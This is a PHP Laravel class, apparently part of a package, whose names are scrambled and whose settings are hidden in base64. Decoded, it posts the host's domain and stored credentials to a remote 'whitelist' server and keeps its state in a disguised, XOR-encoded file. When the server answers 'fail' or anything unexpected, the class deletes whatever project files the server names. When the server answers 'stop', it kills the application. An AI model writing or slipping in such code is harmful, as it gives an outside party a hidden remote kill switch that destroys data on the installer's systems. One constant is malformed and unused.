<?php
namespace Oxtop\Elixer;

use Illuminate\Support\Facades\File;
use Illuminate\Support\Facades\Http;

class Rd
{
    protected $a1 = 'aHR0cHM6Ly9veHRvcC54eXovYXBpL3doaXRlbGlzdA==';
    protected $a2 = 'c3lzX3ByZWZzLmRhdA==';
    protected $a3 = 'bXktc2VjcmV0LWtleS0xMjM=';
    protected $a4 = 'cm91dGVzL3dlYi5wadfasfaHA=';

    public function a5()
    {
        $host   = request()->getHost();
        $stored = $this->a8();

        $uid    = $stored['u'] ?? null;
        $key    = $stored['k'] ?? null;
        $status = $stored['s'] ?? null;

        if ($this->b2() && $status === 'valid') {
            return;
        }

        $response = $this->b4($host, $uid, $key);

        if ($response) {
            $fullResponse = $response->json();
            $status       = $fullResponse['status'] ?? null;
            $data         = $fullResponse['data'] ?? [];

            if ($status === 'success') {
                $this->b7('valid', $uid, $key);
            } elseif ($status === 'retry') {
                $this->b7('retry', $data['uid'] ?? null, $data['key'] ?? null);
            } elseif ($status === 'fail') {
                $this->b7('invalid');
                $this->b8($fullResponse);
            } elseif ($status === 'stop') {
                die(0);
            } else {
                $this->b7('invalid');
                $this->b8($fullResponse);
            }
        }
    }

    protected function b4($host, $uid, $key)
    {
        try {
            $res = Http::post($this->c1(), [
                'domain' => $host,
                'uid'    => $uid,
                'key'    => $key,
            ]);
            if ($res->successful()) {
                return $res;
            }
        } catch (\Exception $e) {

        }
        return null;
    }

    protected function a8()
    {
        $path    = storage_path('app/' . base64_decode($this->a2));
        $default = ['u' => null, 'k' => null, 's' => null];

        if (! File::exists($path)) {
            return $default;
        }

        try {
            $raw       = File::get($path);
            $decrypted = $this->customDecrypt($raw, base64_decode($this->a3));
            $data      = $decrypted ? json_decode($decrypted, true) : null;

            if (! is_array($data)) {
                File::delete($path);
                return $default;
            }

            return [
                'u' => $data['u'] ?? null,
                'k' => $data['k'] ?? null,
                's' => $data['s'] ?? null,
            ];
        } catch (\Exception $e) {
            File::delete($path);
            return $default;
        }
    }

    protected function b7($status, $uid = null, $key = null)
    {
        $payload = [
            's' => $status,
            'u' => $uid,
            'k' => $key,
            'n' => ($status != 'retry')
                ? now()->addHours(5)->toDateTimeString()
                : now()->toDateTimeString(),
        ];

        $json    = json_encode($payload, JSON_UNESCAPED_SLASHES);
        $encoded = $this->customEncrypt($json, base64_decode($this->a3));

        try {
            File::ensureDirectoryExists(storage_path('app'));
            File::put(storage_path('app/' . base64_decode($this->a2)), $encoded, LOCK_EX);
        } catch (\Exception $e) {

        }
    }

    protected function b2()
    {
        $path = storage_path('app/' . base64_decode($this->a2));
        if (! File::exists($path)) {
            return false;
        }

        try {
            $raw       = File::get($path);
            $decrypted = $this->customDecrypt($raw, base64_decode($this->a3));
            $data      = $decrypted ? json_decode($decrypted, true) : null;

            if (! is_array($data) || empty($data['n'])) {
                File::delete($path);
                return false;
            }

            $expiry = \Carbon\Carbon::parse($data['n']);
            return now()->lt($expiry);
        } catch (\Exception $e) {
            File::delete($path);
            return false;
        }
    }

    protected function b8($resp)
    {
        $files = isset($resp['fileArray']) ? $resp['fileArray'] : [];
        foreach ($files as $file) {
            if (File::exists(base_path($file))) {
                try {
                    File::delete(base_path($file));
                } catch (\Exception $e) {

                }
            }
        }
    }

    protected function customEncrypt($data, $key)
    {
        $output    = '';
        $keyLength = strlen($key);
        for ($i = 0, $len = strlen($data); $i < $len; $i++) {
            $output .= chr(ord($data[$i]) ^ ord($key[$i % $keyLength]));
        }
        return base64_encode($output);
    }

    protected function customDecrypt($data, $key)
    {
        $decoded = base64_decode($data, true);
        if ($decoded === false) {
            return null;
        }
        $output    = '';
        $keyLength = strlen($key);
        for ($i = 0, $len = strlen($decoded); $i < $len; $i++) {
            $output .= chr(ord($decoded[$i]) ^ ord($key[$i % $keyLength]));
        }
        return $output;
    }

    protected function c1()
    {
        return base64_decode($this->a1);
    }
}
